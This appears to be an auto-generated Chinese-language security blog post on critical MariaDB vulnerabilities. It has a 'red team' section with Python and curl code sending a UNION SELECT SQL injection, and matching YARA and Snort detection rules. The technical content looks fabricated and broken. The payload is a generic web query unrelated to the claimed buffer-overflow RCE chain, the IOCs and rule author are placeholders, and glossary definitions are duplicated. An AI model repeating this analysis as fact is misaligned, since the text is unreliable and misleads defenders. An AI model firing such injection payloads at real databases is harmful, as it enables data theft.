---
layout: post
title:  "MariaDB資料庫修補多項漏洞，含CVSS滿分10分重大漏洞"
date:   2026-06-09 09:30:51 +0000
categories: [security]
severity: critical
---

# 🚨 解析 MariaDB 高風險漏洞：CVE-2026-49261、CVE-2026-48165 和 CVE-2026-48163
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：10.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: SQL Injection, Buffer Overflow, Deserialization

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: MariaDB 的某些函數沒有正確檢查用戶輸入的邊界，導致 SQL Injection 和 Buffer Overflow 的可能性。
* **攻擊流程圖解**: 
  1. 攻擊者發送精心設計的 SQL 查詢到 MariaDB 伺服器。
  2. MariaDB 伺服器未能正確檢查輸入，導致 SQL Injection。
  3. 攻擊者利用 SQL Injection 導致 Buffer Overflow。
  4. 攻擊者利用 Buffer Overflow 執行任意代碼。
* **受影響元件**: MariaDB 社群版 10.6.27、10.11.18、11.4.12 和 11.8.8 版本，以及企業版 10.6.25-22、11.4.10-8 和 11.8.6-4 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 MariaDB 伺服器的存取權限和網路位置。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義 SQL Injection Payload
    payload = "SELECT * FROM users WHERE id = 1 UNION SELECT * FROM information_schema.tables"
    
    # 發送 Payload 到 MariaDB 伺服器
    response = requests.get("http://example.com/mariadb", params={"query": payload})
    
    # 處理回應
    if response.status_code == 200:
        print("SQL Injection 成功")
    else:
        print("SQL Injection 失敗")
    
    ```
 

```

bash
# 使用 curl 發送 Payload
curl -X GET "http://example.com/mariadb?query=SELECT%20*%20FROM%20users%20WHERE%20id%20=%201%20UNION%20SELECT%20*%20FROM%20information_schema.tables"

```
* **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用編碼或加密來隱藏 Payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /mariadb |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule mariadb_sql_injection {
      meta:
        description = "MariaDB SQL Injection"
        author = "Your Name"
      strings:
        $sql_injection = "SELECT * FROM users WHERE id = 1 UNION SELECT * FROM information_schema.tables"
      condition:
        $sql_injection
    }
    
    ```
 

```

snort
alert tcp any any -> any 3306 (msg:"MariaDB SQL Injection"; content:"SELECT * FROM users WHERE id = 1 UNION SELECT * FROM information_schema.tables"; sid:1000001; rev:1;)

```
* **緩解措施**: 更新 MariaDB 至最新版本，使用強密碼和限制存取權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SQL Injection (SQL 注入)**: 想像一個攻擊者可以在網站的查詢欄中輸入任意的 SQL 代碼，然後網站就會執行這些代碼。技術上是指攻擊者可以在網站的查詢欄中輸入任意的 SQL 代碼，然後網站就會執行這些代碼，導致數據泄露或其他安全問題。
* **Buffer Overflow (緩衝區溢位)**: 想像一個攻擊者可以在一個緩衝區中輸入超過緩衝區大小的數據，然後這些數據就會溢位到其他記憶體位置，導致系統崩潰或其他安全問題。技術上是指攻擊者可以在一個緩衝區中輸入超過緩衝區大小的數據，然後這些數據就會溢位到其他記憶體位置，導致系統崩潰或其他安全問題。
* **Deserialization (反序列化)**: 想像一個攻擊者可以在一個網站中輸入任意的序列化數據，然後網站就會反序列化這些數據，導致安全問題。技術上是指攻擊者可以在一個網站中輸入任意的序列化數據，然後網站就會反序列化這些數據，導致安全問題。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176472)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


